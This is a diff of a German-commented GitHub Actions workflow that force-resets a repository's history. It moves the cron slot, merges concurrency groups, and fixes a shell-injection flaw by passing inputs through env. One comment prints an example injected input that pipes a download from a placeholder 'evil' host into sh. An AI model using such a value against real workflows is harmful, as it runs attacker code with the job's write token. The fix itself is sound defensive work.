@@ -45,7 +45,18 @@ on:
     # 1x monatlich, am 1. um 03:15 UTC - Zeitpunkt bewusst ausserhalb der
     # 8x-taeglichen Combined/Confidence-Slots gewaehlt, um keine Kollision
     # mit deren concurrency-Gruppe zu riskieren.
-    - cron: '15 3 1 * *'
+    # FIX FRESHSTART-SLOT-KOLLISION 01.09.2026 (Review-Fund MITTEL):
+    # Stand vorher auf '15 3 1 * *' mit dem Kommentar, der Zeitpunkt liege
+    # "bewusst ausserhalb der 8x-taeglichen Combined/Confidence-Slots".
+    # Das war nachweislich falsch: update_combined_blacklist.yml startet
+    # '7 */3 * * *', also 03:07, mit 20-40 min realer Laufzeit und
+    # timeout-minutes: 90. Ein Force-Push auf einen Orphan-Branch um 03:15
+    # traf damit regelmaessig einen laufenden Combined-Job, dessen
+    # "Commit and Push" anschliessend gegen eine voellig neue Historie
+    # rebasen musste. Neuer Slot: 05:20 UTC - Combined laeuft 03:47-Backup
+    # und 06:07-Primaer, Confidence '47 1,4,7,...', ip_ablauf '55 */3',
+    # AFD nur sonntags 04:37/07:23/11:47. 05:20 ist in allen Rastern frei.
+    - cron: '20 5 1 * *'
 
 # FIX HEALTH-CHECK (2026-08-08): env-Block ergaenzt, analog zu den anderen
 # Haupt-Workflows im Repo (z.B. update_combined_blacklist.yml). Ohne diese
@@ -64,8 +75,16 @@ permissions:
 # die netshield-seen-db-writers-Gruppe der anderen Workflows), weil dieser
 # Workflow keine der dortigen Dateien schreibt - nur sich selbst gegen
 # parallele Laeufe absichern.
+# FIX FRESHSTART-SLOT-KOLLISION 01.09.2026 (Review-Fund MITTEL):
+# Der Workflow hatte eine EIGENE concurrency-Gruppe mit der Begruendung, er
+# schreibe keine der Dateien der anderen Workflows. Das stimmt fuer den
+# Dateiinhalt, aber nicht fuer das Ziel: 'git push origin main --force' auf
+# einen Orphan-Branch ersetzt die gesamte Historie von main - genau des
+# Branch, auf den update_combined_blacklist.yml, update_confidence_blacklist.yml
+# und ip_ablauf.yml im selben Moment committen. Der Workflow gehoert deshalb
+# in dieselbe Serialisierungsgruppe wie alle anderen main-Schreiber.
 concurrency:
-  group: netshield-history-fresh-start
+  group: netshield-seen-db-writers
   cancel-in-progress: false
 
 jobs:
@@ -74,10 +93,24 @@ jobs:
     timeout-minutes: 20
     steps:
       - name: Bestaetigung pruefen
+        # FIX SEC-SHELL-INTERPOLATION 01.09.2026 (Review-Fund NIEDRIG):
+        # confirm_reset ist ein Freitext-Input und wurde direkt per
+        # ${{ ... }} in eine doppelt gequotete Shell-Zeile interpoliert.
+        # GitHub ersetzt den Ausdruck VOR der Shell-Auswertung, ein Wert wie
+        #   x"; curl http://evil/ | sh; echo "
+        # bricht damit aus dem String aus und laeuft mit contents: write und
+        # dem GITHUB_TOKEN dieses Jobs. Ausnutzbar nur fuer jemanden, der
+        # ohnehin workflow_dispatch ausloesen darf - trotzdem der falsche
+        # Weg. Der Wert kommt jetzt ueber env in die Umgebung und wird als
+        # normale Shell-Variable in Anfuehrungszeichen verglichen, wo keine
+        # Ersetzung mehr stattfindet.
+        env:
+          CONFIRM_RESET: ${{ github.event.inputs.confirm_reset }}
+          EVENT_NAME: ${{ github.event_name }}
         run: |
-          if [ "${{ github.event_name }}" = "schedule" ]; then
+          if [ "$EVENT_NAME" = "schedule" ]; then
             echo "Automatischer monatlicher Lauf (schedule-Trigger) - Bestaetigung durch Trigger-Typ selbst, fahre fort."
-          elif [ "${{ github.event.inputs.confirm_reset }}" != "HISTORIE ZURUECKSETZEN" ]; then
+          elif [ "$CONFIRM_RESET" != "HISTORIE ZURUECKSETZEN" ]; then
             echo "::error::Bestaetigungstext stimmt nicht exakt ueberein. Abgebrochen, nichts wurde veraendert."
             exit 1
           else
